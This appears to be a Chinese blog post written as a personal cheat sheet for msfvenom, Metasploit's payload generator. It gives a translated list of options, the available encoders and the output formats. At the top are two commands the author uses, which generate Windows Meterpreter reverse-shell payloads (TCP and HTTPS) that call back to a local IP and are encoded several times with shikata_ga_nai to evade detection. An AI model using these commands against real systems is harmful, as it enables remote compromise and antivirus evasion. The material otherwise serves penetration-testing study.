---
title: "msfvenom命令"
layout: "post"
categories:
  - 学习
tags:
  - 学习
keywords:
  - msfvenom帮助解释
date: "2018-01-01 21:40"
updated: "2018-01-01 21:40"
abbrlink:
comments:
---
# msfvenom常用指南
个人经常使用msfveom命令
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.78 lport=443 -e x86/shikata_ga_nai -f c -i 6 --smallest
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.0.78 lport=443 -e x86/shikata_ga_nai -f c -i 6 --smallest
```
### msfvenom 帮助
```
-p, --payload       <payload>     指定Payload
     --payload-options            列出 payload选项
 -l, --list          [type]       列出 payloads, encoders, nops, all
 -n, --nopsled       <length>     添加 payload 下nopsled 大小
 -f, --format        <format>     指定输出格式
     --help-formats               列出支持格式
 -e, --encoder       <encoder>    指定编码器
 -a, --arch          <arch>       指定结构(x86,x64)
     --platform      <platform>   payload平台
     --help-platforms             列出可用平台
 -s, --space         <length>     设置 payload 大小
     --encoder-space <length>     设置payload编码器大小默认-s
 -b, --bad-chars     <list>       设置规避字符。如: '\x00\xff'
 -i, --iterations    <count>      设置 payload编码几次
 -c, --add-code      <path>       指定 win32 shellcode 文件
 -x, --template      <path>       指定可执行文件模板
 -k, --keep                       保留模板功能，payload已注入线程模式运行
 -o, --out           <path>       保存文件路径
 -v, --var-name      <name>       指定输出格式的自定义变量名称
     --smallest                   生成最小 payload
 -h, --help                       帮助

```
## 编码器
使用比较多的编码器：x86/shikata_ga_nai
```
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder

```
## 输出格式
#### 文件模式格式
```
asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
```
#### 转换格式
```
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```
